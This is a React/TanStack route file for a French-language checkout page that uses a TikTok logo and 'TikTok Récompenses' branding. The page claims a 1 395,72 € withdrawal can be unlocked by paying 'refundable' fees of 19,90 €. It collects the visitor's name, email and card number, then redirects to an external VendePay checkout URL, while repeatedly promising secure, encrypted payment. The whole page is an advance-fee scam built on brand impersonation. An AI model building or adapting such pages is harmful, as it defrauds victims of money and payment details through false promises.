import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { Shield, Lock, CreditCard, ArrowRight } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";

export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Paiement sécurisé | Déblocage du retrait" },
      {
        name: "description",
        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
      },
      { property: "og:title", content: "Paiement sécurisé | Déblocage du retrait" },
      {
        property: "og:description",
        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Checkout,
});

const VENDEPAY_CHECKOUT_URL = "https://checkout.vendepay.com/2cd2b8a8-cfcf-4f72-a01f-01d7363cd7a5";

function Checkout() {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    cardNumber: "",
  });

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.slice(i, i + 4));
    }
    return parts.join(" ").slice(0, 23);
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData((prev) => ({ ...prev, cardNumber: formatCardNumber(e.target.value) }));
  };

  const handleContinue = () => {
    if (!formData.fullName.trim() || !formData.email.trim() || !formData.cardNumber.trim()) {
      return;
    }
    window.location.href = VENDEPAY_CHECKOUT_URL;
  };

  return (
    <main className="min-h-screen w-full bg-gradient-to-br from-pink-100 via-rose-50 to-white px-4 py-8">
      <div className="mx-auto w-full max-w-md">
        {/* Logo / Header */}
        <div className="mb-6 text-center">
          <img
            src={tiktokLogo.url}
            alt="TikTok Récompenses"
            className="mx-auto mb-4 h-12 w-auto object-contain"
          />
          <div className="flex items-center justify-center gap-2 text-sm font-medium text-emerald-600">
            <Shield className="h-4 w-4" />
            Paiement sécurisé
          </div>
        </div>

        {/* Main Card */}
        <div className="rounded-3xl bg-white p-6 shadow-xl sm:p-8">
          {/* Summary */}
          <div className="mb-6 text-center">
            <h1 className="mb-2 text-xl font-black text-neutral-900">
              Déblocage du retrait de 1 395,72 €
            </h1>
            <p className="text-sm text-neutral-600">
              Frais remboursables :{" "}
              <span className="font-bold text-rose-600">19,90 €</span>
            </p>
          </div>

          {/* Reimbursement details */}
          <div className="mb-6 rounded-2xl border border-neutral-200 bg-neutral-50/70 p-4">
            <h2 className="mb-3 text-sm font-bold text-neutral-800">
              Coordonnées pour le remboursement
            </h2>
            <div className="space-y-3">
              <div>
                <label
                  htmlFor="fullName"
                  className="mb-1 block text-xs font-semibold text-neutral-700"
                >
                  Nom complet
                </label>
                <input
                  id="fullName"
                  type="text"
                  value={formData.fullName}
                  onChange={(e) =>
                    setFormData((prev) => ({ ...prev, fullName: e.target.value }))
                  }
                  placeholder="Jean Dupont"
                  className="w-full rounded-xl border border-neutral-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400 focus:ring-2 focus:ring-rose-200"
                />
              </div>
              <div>
                <label
                  htmlFor="email"
                  className="mb-1 block text-xs font-semibold text-neutral-700"
                >
                  E-mail
                </label>
                <input
                  id="email"
                  type="email"
                  inputMode="email"
                  autoComplete="email"
                  value={formData.email}
                  onChange={(e) =>
                    setFormData((prev) => ({ ...prev, email: e.target.value }))
                  }
                  placeholder="vous@email.com"
                  className="w-full rounded-xl border border-neutral-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400 focus:ring-2 focus:ring-rose-200"
                />
              </div>
              <div>
                <label
                  htmlFor="cardNumber"
                  className="mb-1 block text-xs font-semibold text-neutral-700"
                >
                  Numéro de carte
                </label>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-neutral-400" />
                  <input
                    id="cardNumber"
                    type="text"
                    inputMode="numeric"
                    value={formData.cardNumber}
                    onChange={handleCardChange}
                    placeholder="0000 0000 0000 0000"
                    className="w-full rounded-xl border border-neutral-300 bg-white py-3 pl-10 pr-4 text-sm outline-none focus:border-rose-400 focus:ring-2 focus:ring-rose-200"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Bank details section - highlighted button */}
          <div className="mb-6 rounded-2xl border border-neutral-200 bg-white p-4">
            <h2 className="mb-3 flex items-center gap-2 text-sm font-bold text-neutral-800">
              <Lock className="h-4 w-4 text-emerald-500" />
              Coordonnées bancaires
            </h2>
            <p className="mb-4 text-xs text-neutral-500">
              Cliquez ci-dessous pour continuer de manière sécurisée vers la page de paiement.
            </p>
            <button
              type="button"
              onClick={handleContinue}
              className="flex w-full items-center justify-center gap-2 rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-4 font-bold text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
            >
              Continuar
              <ArrowRight className="h-4 w-4" />
            </button>
          </div>

          {/* Security footer */}
          <div className="flex items-center justify-center gap-2 text-[11px] text-neutral-400">
            <Lock className="h-3 w-3" />
            Paiement 100 % sécurisé et chiffré
          </div>
        </div>

        <p className="mt-6 text-center text-[11px] leading-snug text-neutral-400">
          Les frais de 19,90 € sont remboursables une fois le retrait débloqué et traité.
        </p>
      </div>
    </main>
  );
}
